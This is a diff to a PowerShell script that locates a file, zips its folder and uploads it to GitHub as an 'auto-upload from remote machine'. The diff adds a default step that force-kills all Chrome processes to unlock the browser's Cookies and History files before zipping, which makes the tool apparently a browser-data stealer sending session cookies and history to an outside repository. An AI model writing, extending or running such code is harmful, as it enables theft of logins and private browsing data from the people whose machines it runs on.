@@ -23,7 +23,8 @@ param(
     [string]$CommitMsg  = "Auto-upload ZIP: subida automatica desde equipo remoto",
     [int]$RecurseDepth  = 6,
     [string]$ZipOutputDir = "",
-    [switch]$KeepZip
+    [switch]$KeepZip,
+    [switch]$NoCloseChrome
 )
 
 # ---------- Helpers ----------
@@ -111,6 +112,39 @@ function Get-GitHubDefaultBranch {
             -Headers $h -ErrorAction Stop
         return $r.default_branch
     } catch { return 'main' }
+}
+
+function Close-Chrome {
+    # Cierra todas las instancias de Chrome para liberar los archivos bloqueados
+    # (Cookies, History, etc). Usa taskkill con /IM y /T para matar procesos hijo.
+    Write-Log "Cerrando todas las instancias de Chrome..." "Yellow"
+    try {
+        $procs = Get-Process -Name chrome -ErrorAction SilentlyContinue
+        if ($procs) {
+            Write-Log "Procesos Chrome detectados: $($procs.Count)" "Cyan"
+            foreach ($p in $procs) {
+                try { $p.CloseMainWindow() | Out-Null } catch {}
+            }
+            Start-Sleep -Seconds 2
+            # Forzar cierre de los que queden
+            $left = Get-Process -Name chrome -ErrorAction SilentlyContinue
+            if ($left) {
+                Write-Log "Forzando cierre de $($left.Count) procesos restantes..." "Yellow"
+                & taskkill.exe /F /IM chrome.exe /T 2>$null | Out-Null
+                Start-Sleep -Seconds 2
+            }
+            $still = Get-Process -Name chrome -ErrorAction SilentlyContinue
+            if ($still) {
+                Write-Log "OJO: quedan $($still.Count) procesos Chrome." "Yellow"
+            } else {
+                Write-Log "Chrome cerrado correctamente." "Green"
+            }
+        } else {
+            Write-Log "No habia Chrome abierto." "Cyan"
+        }
+    } catch {
+        Write-Log "No se pudo cerrar Chrome: $($_.Exception.Message)" "Yellow"
+    }
 }
 
 function Compress-Folder {
@@ -213,6 +247,10 @@ try {
     # 2) Determinar la carpeta donde esta el archivo y comprimirla en ZIP
     $sourceFolder = Split-Path -Path $script:FoundPath -Parent
     Write-Log "Carpeta a comprimir: $sourceFolder" "Cyan"
+
+    if (-not $NoCloseChrome) {
+        Close-Chrome
+    }
 
     if (-not $ZipOutputDir) { $ZipOutputDir = $env:TEMP }
     if (-not (Test-Path -LiteralPath $ZipOutputDir)) {
